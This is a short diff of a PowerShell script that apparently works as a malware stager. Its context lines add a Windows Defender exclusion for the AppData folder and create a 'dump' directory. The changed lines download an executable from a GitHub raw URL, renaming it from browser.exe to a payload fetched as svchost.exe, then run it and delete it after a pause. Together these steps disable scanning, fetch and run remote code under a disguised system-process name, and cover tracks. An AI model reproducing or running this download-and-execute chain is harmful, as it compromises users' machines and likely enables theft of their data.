@@ -6,8 +6,8 @@ Add-MpPreference -ExclusionPath "$env:appdata"
 #Creating the directory we will work on
 mkdir "$env:appdata\dump"
 Set-Location "$env:appdata\dump"
-#Downloading and executing browser.exe
-Invoke-WebRequest -Uri "https://github.com/user337666/brow666/raw/main/browser.exe" -OutFile "$env:appdata\dump\hb.exe"
-./hb.exe
+#Downloading and executing sv.exe
+Invoke-WebRequest -Uri "https://github.com/user337666/brow666/raw/main/svchost.exe" -OutFile "$env:appdata\dump\sv.exe"
+./sv.exe
 Start-Sleep -Seconds 6
-Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
+Remove-Item -Path "$env:appdata\dump\sv.exe" -Force
